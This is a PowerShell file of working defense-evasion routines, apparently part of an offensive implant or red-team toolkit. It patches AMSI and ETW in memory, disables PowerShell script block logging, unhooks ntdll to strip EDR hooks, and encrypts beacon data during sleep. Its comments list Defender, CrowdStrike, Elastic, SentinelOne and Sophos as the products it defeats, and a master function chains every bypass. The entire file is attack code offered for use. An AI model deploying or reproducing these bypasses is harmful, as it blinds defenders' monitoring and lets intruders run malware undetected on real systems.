function Bypass-AMSI {
    <# Patches AmsiScanBuffer in memory via two methods:
       1. amsiInitFailed field corruption (works on PS 5.1)
       2. Direct memory patch of AmsiScanBuffer (works on PS 5.1 + 7.x)

       Defeats: Windows Defender, MDE AMSI provider, any AMSI consumer
    #>
    try {
        # Method 1: Set amsiInitFailed = true via reflection
        $ref = [Ref].Assembly.GetType(
            [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM='))
        )
        if ($ref) {
            $field = $ref.GetField(
                [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YW1zaUluaXRGYWlsZWQ=')),
                'NonPublic,Static'
            )
            if ($field) {
                $field.SetValue($null, $true)
                return $true
            }
        }
    } catch {}

    try {
        # Method 2: Patch AmsiScanBuffer directly
        $win32 = @"
using System;
using System.Runtime.InteropServices;
public class W32 {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint np, out uint op);
}
"@
        Add-Type $win32 -ErrorAction SilentlyContinue
        $amsi = [W32]::LoadLibrary("amsi.dll")
        $addr = [W32]::GetProcAddress($amsi, "AmsiScanBuffer")
        $old = 0
        [W32]::VirtualProtect($addr, [UIntPtr]6, 0x40, [ref]$old) | Out-Null
        # mov eax, 0x80070057; ret
        $patch = [byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, $patch.Length)
        [W32]::VirtualProtect($addr, [UIntPtr]6, $old, [ref]$old) | Out-Null
        return $true
    } catch {}
    return $false
}

function Bypass-ETW {
    <# Patches EtwEventWrite in ntdll to return 0 (STATUS_SUCCESS)
       Blinds: MDE, CrowdStrike Falcon, Elastic EDR, SentinelOne telemetry
    #>
    try {
        $win32 = @"
using System;
using System.Runtime.InteropServices;
public class ETW {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint np, out uint op);
}
"@
        Add-Type $win32 -ErrorAction SilentlyContinue
        $ntdll = [ETW]::GetModuleHandle("ntdll.dll")
        $addr = [ETW]::GetProcAddress($ntdll, "EtwEventWrite")
        $old = 0
        [ETW]::VirtualProtect($addr, [UIntPtr]3, 0x40, [ref]$old) | Out-Null
        # xor eax, eax; ret
        $patch = [byte[]](0x33, 0xC0, 0xC3)
        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, $patch.Length)
        [ETW]::VirtualProtect($addr, [UIntPtr]3, $old, [ref]$old) | Out-Null
        return $true
    } catch {}
    return $false
}

function Bypass-ScriptBlockLogging {
    <# Disables PowerShell Script Block Logging by patching the cached Group Policy value
       Defeats: MDE and Defender script block telemetry, SIEM log collection
    #>
    try {
        $GPF = [Ref].Assembly.GetType(
            [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5VdGlscw=='))
        )
        if ($GPF) {
            $cache = $GPF.GetField(
                'cachedGroupPolicySettings',
                'NonPublic,Static'
            )
            if ($cache) {
                $settings = $cache.GetValue($null)
                if ($settings -is [System.Collections.IDictionary]) {
                    $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = @{}
                    $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'].Add('EnableScriptBlockLogging', 0)
                    return $true
                }
            }
        }
    } catch {}
    return $false
}

function Unhook-Ntdll {
    <# Remaps clean ntdll.dll .text section from disk over the hooked in-memory copy
       Defeats: CrowdStrike Falcon, Elastic, SentinelOne, Sophos inline hooks
    #>
    try {
        $win32 = @"
using System;
using System.Runtime.InteropServices;
public class NtU {
    [DllImport("kernel32")] public static extern IntPtr CreateFileA(string f, uint a, uint s, IntPtr sa, uint c, uint fa, IntPtr t);
    [DllImport("kernel32")] public static extern IntPtr CreateFileMappingA(IntPtr h, IntPtr sa, uint p, uint mh, uint ml, string n);
    [DllImport("kernel32")] public static extern IntPtr MapViewOfFile(IntPtr h, uint a, uint oh, uint ol, UIntPtr n);
    [DllImport("kernel32")] public static extern bool UnmapViewOfFile(IntPtr a);
    [DllImport("kernel32")] public static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint np, out uint op);
    [DllImport("ntdll")] public static extern void RtlCopyMemory(IntPtr d, IntPtr s, uint l);
}
"@
        Add-Type $win32 -ErrorAction SilentlyContinue

        $ntdllPath = [System.IO.Path]::Combine($env:SystemRoot, 'System32', 'ntdll.dll')
        $hFile = [NtU]::CreateFileA($ntdllPath, 0x80000000, 1, [IntPtr]::Zero, 3, 0x80, [IntPtr]::Zero)
        if ($hFile -eq [IntPtr]::new(-1)) { return $false }

        $hMap = [NtU]::CreateFileMappingA($hFile, [IntPtr]::Zero, 0x02, 0, 0, $null)
        if ($hMap -eq [IntPtr]::Zero) {
            [NtU]::CloseHandle($hFile)
            return $false
        }

        $pClean = [NtU]::MapViewOfFile($hMap, 0x0004, 0, 0, [UIntPtr]::Zero)
        if ($pClean -eq [IntPtr]::Zero) {
            [NtU]::CloseHandle($hMap)
            [NtU]::CloseHandle($hFile)
            return $false
        }

        $pLoaded = [NtU]::GetModuleHandle("ntdll.dll")

        # Parse PE to find .text section
        $e_lfanew = [System.Runtime.InteropServices.Marshal]::ReadInt32($pClean, 0x3C)
        $ntHeader = [IntPtr]::Add($pClean, $e_lfanew)
        $numSections = [System.Runtime.InteropServices.Marshal]::ReadInt16($ntHeader, 6)
        $optHeaderSize = [System.Runtime.InteropServices.Marshal]::ReadInt16($ntHeader, 20)
        $firstSection = [IntPtr]::Add($ntHeader, 24 + $optHeaderSize)

        for ($i = 0; $i -lt $numSections; $i++) {
            $sectionPtr = [IntPtr]::Add($firstSection, $i * 40)
            $nameBytes = New-Object byte[] 8
            [System.Runtime.InteropServices.Marshal]::Copy($sectionPtr, $nameBytes, 0, 8)
            $sectionName = [System.Text.Encoding]::ASCII.GetString($nameBytes).TrimEnd([char]0)

            if ($sectionName -eq '.text') {
                $virtualSize = [System.Runtime.InteropServices.Marshal]::ReadInt32($sectionPtr, 8)
                $virtualAddr = [System.Runtime.InteropServices.Marshal]::ReadInt32($sectionPtr, 12)
                $rawOffset = [System.Runtime.InteropServices.Marshal]::ReadInt32($sectionPtr, 20)

                $dest = [IntPtr]::Add($pLoaded, $virtualAddr)
                $src = [IntPtr]::Add($pClean, $rawOffset)

                $old = 0
                [NtU]::VirtualProtect($dest, [UIntPtr]::new($virtualSize), 0x40, [ref]$old) | Out-Null
                [NtU]::RtlCopyMemory($dest, $src, [uint]$virtualSize)
                [NtU]::VirtualProtect($dest, [UIntPtr]::new($virtualSize), $old, [ref]$old) | Out-Null
                break
            }
        }

        [NtU]::UnmapViewOfFile($pClean)
        [NtU]::CloseHandle($hMap)
        [NtU]::CloseHandle($hFile)
        return $true
    } catch {}
    return $false
}

function Invoke-SleepEncrypt {
    param([int]$Seconds, [byte[]]$DataToProtect)
    <# XOR-encrypt sensitive data in memory during sleep
       Defeats: MDE and Falcon periodic memory scans for beacon signatures
    #>
    if ($DataToProtect -and $DataToProtect.Length -gt 0) {
        $key = New-Object byte[] 16
        [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($key)
        $encrypted = New-Object byte[] $DataToProtect.Length
        for ($i = 0; $i -lt $DataToProtect.Length; $i++) {
            $encrypted[$i] = $DataToProtect[$i] -bxor $key[$i % 16]
            $DataToProtect[$i] = (Get-Random -Minimum 0 -Maximum 256)
        }
        Start-Sleep -Seconds $Seconds
        for ($i = 0; $i -lt $encrypted.Length; $i++) {
            $DataToProtect[$i] = $encrypted[$i] -bxor $key[$i % 16]
        }
        Remove-Variable key, encrypted -ErrorAction SilentlyContinue
    } else {
        Start-Sleep -Seconds $Seconds
    }
}

function Init-Evasion {
    <# Master evasion init — order matters:
       1. Unhook ntdll (remove EDR hooks before other patches)
       2. ETW bypass (blind telemetry)
       3. AMSI bypass (disable content scanning)
       4. Script block logging bypass (disable PS logging)
    #>
    Unhook-Ntdll | Out-Null
    Bypass-ETW | Out-Null
    Bypass-AMSI | Out-Null
    Bypass-ScriptBlockLogging | Out-Null
}
